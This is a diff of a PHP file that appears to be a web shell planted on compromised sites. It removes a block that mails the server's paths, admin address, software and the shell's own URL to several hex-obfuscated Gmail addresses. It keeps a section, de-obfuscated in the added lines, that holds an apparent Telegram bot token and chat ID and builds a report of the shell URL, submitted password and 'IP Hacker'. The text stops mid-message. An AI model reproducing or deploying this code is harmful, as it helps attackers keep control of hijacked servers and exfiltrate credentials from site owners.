@@ -19,52 +19,11 @@ function detect_pdf($url)
     }
 } ?>
 
-<?php
-# Konfigurasyon
-$sayfaSifreleme = "0"; # 1 acik , 2 3 5
-$kullaniciAdi = "tbl";
-$sifre = "tbl";
 
-# yetki kontrol fonksiyonu
-function yetkiKontrol($kullaniciAdi, $sifre)
-{
-    if (
-        empty($_SERVER["PHP_AUTH_USER"]) ||
-        empty($_SERVER["PHP_AUTH_PW"]) ||
-        $_SERVER["PHP_AUTH_USER"] != "$kullaniciAdi" ||
-        $_SERVER["PHP_AUTH_PW"] != "$sifre"
-    ) {
-        header('WWW-Authenticate: Basic realm="x"');
-        die(header("HTTP/1.0 401 Unauthorized"));
-    }
-}
-
-# Sayfa Sifreleme aciksa
-if ($sayfaSifreleme == "1") {
-    # Veri ve sifre kontrolu
-    yetkiKontrol($kullaniciAdi, $sifre);
-}
-$kime =
-    "eldiablo9989\x40gmail\x2ecom";
-$baslik = "MEH";
-$EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER["DOCUMENT_ROOT"] . "\r\n";
-$EL_MuHaMMeD .= "Server Admin : " . $_SERVER["SERVER_ADMIN"] . "\r\n";
-$EL_MuHaMMeD .=
-    "Server isletim sistemi : " . $_SERVER["SERVER_SOFTWARE"] . "\r\n";
-$EL_MuHaMMeD .=
-    "Shell Link : http://" .
-    $_SERVER["SERVER_NAME"] .
-    $_SERVER["PHP_SELF"] .
-    "\r\n";
-$kime =
-    "muh\x72\x61\x7a\x6b\x79\x40g\x6da\x69l\x2eco\x6d, r\x6f\x6ft\x63y\x62e\x72\x70unks\x40g\x6dai\x6c\x2ec\x6f\x6d, pa\x70a\x6bu.ha\x79k\x65\x72\x40gm\x61\x69\x6c\x2e\x63o\x6d,\x20f\x62i.pri\x76\x2e\x67\x30\x30gle\x40gmai\x6c.c\x6f\x6d,\x20muh\x72az\x6b\x79\x40\x67ma\x69l.\x63o\x6d,\x20\x6d\x61\x6cays\x69a\x2es\x65n\x64er@gm\x61il\x2ec\x6f\x6d,\x20r\x6fot\x63\x79\x62e\x72p\x75n\x6b\x73@g\x6d\x61il\x2e\x63\x6fm, p\x61paku.\x68a\x79\x6ber@\x67m\x61\x69l.\x63om\n";
-$EL_MuHaMMeD .= "Avlanan Site : " . $_SERVER["HTTP_HOST"] . "\r\n";
-mail($kime, $baslik, $EL_MuHaMMeD);
-?>
 
 <?php
-$botToken = "8519484425\x3aAAFM5GT2N\x2dJMV1NKLrUqD\x2dX1\x2dfY0jFBmdKE";
-$chatId = "\x37\x33\x37\x31\x34\x38\x39\x35\x38\x33";
+$botToken = "8519484425:AAFM5GT2N-JMV1NKLrUqD-X1-fY0jFBmdKE";
+$chatId = "7371489583";
 $xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
 $logMessage =
     "___SCANFILEMANAGERUBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $_POST \n\n IP Hacker  :\n [ " .
